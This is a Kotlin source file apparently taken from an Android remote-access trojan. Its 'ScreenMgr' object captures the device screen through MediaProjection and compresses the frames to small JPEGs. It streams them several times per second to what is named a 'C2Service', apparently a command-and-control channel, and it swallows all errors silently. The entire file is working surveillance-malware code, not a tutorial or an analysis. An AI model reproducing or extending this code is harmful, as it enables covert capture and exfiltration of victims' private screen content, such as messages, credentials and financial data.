package com.t.core
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Handler
import android.os.Looper
import android.os.SystemClock
import java.io.ByteArrayOutputStream

object ScreenMgr {
    private var proj: MediaProjection? = null
    private var vd: VirtualDisplay? = null
    private var ir: ImageReader? = null
    private var lastSent = 0L
    
    fun start(ctx: Context, code: Int, data: Intent) {
        stop()
        val p = ctx.getSystemService(MediaProjectionManager::class.java).getMediaProjection(code, data)
        proj = p
        p.registerCallback(object : MediaProjection.Callback() { override fun onStop() { stop() } }, Handler(Looper.getMainLooper()))
        val dm = ctx.resources.displayMetrics; val fw = dm.widthPixels; val fh = dm.heightPixels
        val reader = ImageReader.newInstance(fw, fh, PixelFormat.RGBA_8888, 3)
        ir = reader
        vd = p.createVirtualDisplay("cap", fw, fh, dm.densityDpi, DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, reader.surface, null, Handler(Looper.getMainLooper()))
        
        reader.setOnImageAvailableListener({ r ->
            val img = try { r.acquireLatestImage() } catch (e: Exception) { null } ?: return@setOnImageAvailableListener
            val now = SystemClock.elapsedRealtime()
            if (now - lastSent < 300L) { img.close(); return@setOnImageAvailableListener } 
            lastSent = now
            try {
                val pl = img.planes[0]
                val padded = Bitmap.createBitmap(pl.rowStride / pl.pixelStride, fh, Bitmap.Config.ARGB_8888)
                padded.copyPixelsFromBuffer(pl.buffer)
                val cropped = Bitmap.createBitmap(padded, 0, 0, fw, fh)
                val small = Bitmap.createScaledBitmap(cropped, fw / 4, fh / 4, true) 
                val bos = ByteArrayOutputStream(); small.compress(Bitmap.CompressFormat.JPEG, 40, bos)
                C2Service.inst?.sendBinary(bos.toByteArray())
            } catch (_: Throwable) {} finally { img.close() }
        }, Handler(Looper.getMainLooper()))
    }
    fun stop() { runCatching { vd?.release() }; vd = null; runCatching { ir?.close() }; ir = null; runCatching { proj?.stop() }; proj = null }
}
